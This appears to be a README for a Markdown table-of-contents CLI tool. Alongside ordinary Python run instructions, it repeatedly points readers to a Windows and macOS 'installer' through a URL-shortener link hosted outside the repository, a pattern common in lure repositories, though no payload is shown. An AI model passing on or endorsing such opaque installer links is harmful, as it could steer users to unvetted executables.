![Markdown TOC Links](assets/hero.png)

# Markdown TOC Links

*A TOC that matches GitHub heading ids.*

## What Markdown TOC Links is

This repository is **Markdown TOC Links**, a developer utility. A TOC that matches GitHub heading ids.

A long README needs a map that actually jumps.

The CLI is the source of truth. The desktop build is optional if you do not want Python installed.

## Editions

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## What it does

- Anchor slugs
- Marker block
- Preview
- UTF-8

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/geraldb8856/markdown-toc-links

MIT license. See `LICENSE`.
